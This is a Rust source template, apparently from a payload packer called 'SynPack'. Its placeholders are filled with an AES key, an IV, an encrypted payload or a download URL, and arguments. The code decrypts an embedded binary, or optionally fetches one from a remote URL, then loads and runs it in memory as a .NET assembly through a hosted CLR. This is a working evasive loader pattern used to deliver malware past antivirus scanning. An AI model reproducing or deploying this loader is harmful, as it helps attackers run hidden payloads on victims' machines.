#![allow(unused_imports, unused_mut)]
use std::env;
use aes::cipher::{KeyIvInit, BlockDecryptMut, block_padding::Pkcs7};
use bytes::{BytesMut, BufMut};
use clroxide::clr::Clr;
use futures_util::StreamExt;

//AES_START
fn decrypt_aes(buf: &mut Vec<u8>) {

    let key: [u8; 16] = [SYNPACK_KEY];
    let iv: [u8; 16]  = [SYNPACK_IV];

    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
}
//AES_END

//WEB_START
async fn get_data() -> Vec<u8> {
    let url: &str = "SYNPACK_URL";
    let mut stream = reqwest::get(url).await.unwrap().bytes_stream();

    let mut buf: BytesMut = BytesMut::new();

    while let Some(bytes) = stream.next().await {
        buf.put(bytes.unwrap());
    }
    return buf.to_vec();
}
//WEB_END

#[tokio::main]
async fn main() {

    let mut bin_data: Vec<u8> = vec![SYNPACK_DATA];

    let mut args: Vec<String> = vec![SYNPACK_ARGS];

    if args.len() == 0 {
        let mut cmd_args: Vec<String> = env::args().collect();
        cmd_args.remove(0);
        args = cmd_args;
    }
    
    decrypt_aes(&mut bin_data);
    let mut clr: Clr = Clr::new(bin_data, args).unwrap();

    let result: String = clr.run().unwrap();

    println!("{}", result);
}